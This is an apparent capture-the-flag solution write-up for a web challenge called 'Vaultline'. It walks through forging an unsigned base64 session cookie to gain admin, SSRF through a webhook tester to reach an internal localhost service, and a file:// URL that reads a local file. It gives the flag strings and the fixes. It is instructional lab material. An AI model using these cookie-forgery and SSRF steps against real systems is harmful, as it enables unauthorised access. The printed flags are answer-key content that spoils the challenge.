# Vaultline — Solution

> ⚠️ SPOILERS BELOW — try the challenge first.

## Flag 1 — Cookie Tampering (Broken Access Control)

The app stores session state in a client-side cookie (`session_data`)
that is base64-encoded JSON with **no cryptographic signature**.

```bash
# Log in as guest/guest, grab the session_data cookie value
echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIn0=' | base64 -d
# → {"user":"guest","role":"viewer"}

# Tamper: change role to admin
echo -n '{"user":"guest","role":"admin"}' | base64
# → eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==

# Replace the cookie in DevTools → Application → Cookies, reload /admin
```

**Flag:** `FLAG{c00k13_t4mp3r_r0l3_3sc4l4t10n}`

**Vulnerability:** The server trusts client-supplied session data without
verifying its integrity. No HMAC, no signature, no server-side session
store.

**Fix:** Use Flask's built-in `session` (which signs the cookie with the
`secret_key`) or a server-side session store.

---

## Flag 2 — SSRF to Internal Service

The admin panel's JavaScript fetches `/api/status`, which returns:

```json
{
  "services": [
    {"name": "database", "status": "healthy", "endpoint": "internal"},
    {"name": "metadata-svc", "status": "healthy",
     "endpoint": "http://localhost:9090"},
    {"name": "vault-core", "status": "healthy", "endpoint": "internal"}
  ]
}
```

The rendered page only shows names and status badges — the `endpoint`
field is hidden. Viewing the raw JSON in the Network tab reveals the
internal service address.

Use the webhook tester to reach it:

```
URL: http://localhost:9090/metadata
```

The response contains flag2 and a hint about `/flag3.txt`.

**Flag:** `FLAG{ssrf_1nt3rn4l_s3rv1c3_4cc3ss}`

**Vulnerability:** Server-Side Request Forgery — the webhook endpoint
makes HTTP requests to arbitrary URLs, including internal services that
are not externally reachable.

**Fix:** Validate webhook URLs against an allowlist. Block private IP
ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 169.254.0.0/16).

---

## Flag 3 — SSRF with file:// Protocol

The webhook fetcher uses Python's `urllib.request.urlopen()`, which
supports multiple URL schemes including `file://`.

```
URL: file:///flag3.txt
```

**Flag:** `FLAG{ssrf_f1l3_pr0t0c0l_r34d}`

**Vulnerability:** The URL fetcher does not restrict schemes. The
`file://` scheme reads local files directly, bypassing all network-layer
controls.

**Fix:** Restrict allowed schemes to `http` and `https` only. Parse the
URL and reject anything else before making the request.
